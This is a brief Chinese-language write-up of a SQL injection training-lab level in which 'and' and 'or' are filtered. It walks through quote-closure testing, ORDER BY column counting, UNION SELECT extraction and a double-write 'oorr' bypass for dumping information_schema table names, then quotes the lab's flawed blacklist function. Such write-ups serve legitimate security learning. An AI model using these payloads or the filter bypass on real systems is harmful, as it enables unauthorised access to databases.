这题and or被过滤了。

去搜了下过滤方法。





我先测报错

?id=1'

有报错

测试

```
?id='1 --+
无报错
```

,为单引号闭合的字符型注入



order by测列数及回显。

```
?id=1' oorrdey by 4 --+
报错
再测3
成功
```





下面用相同的步骤（这里我以为和23题相同，最后用了‘3来闭合，不过没关系，如果不用’3,添加--+即可）

```
?id=-1' union select 1,database(),3 --+
```



```
?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()) ,'3
```

 结果，没想到，information_schema这个表名被过滤了，变成了infmation，**or**没了

```
Hint: Your Input is Filtered with following result: -1' union select 1,(select group_concat(table_name) from infmation_schema.tables where table_schema=database()) ,'3
```



这里我采用的是oorr双写来绕过

```
?id=-1' union select 1,(select group_concat(table_name) from inforoorrmation_schema.tables where table_schema=database()) ,'3
```

成功爆出表，

下面步骤不再赘述





blacklist源码

```
function blacklist($id)
{
      $id= preg_replace('/or/i',"", $id);      //strip out OR (non case sensitive)
      $id= preg_replace('/AND/i',"", $id);      //Strip out AND (non case sensitive)
	
      return $id;
}
```





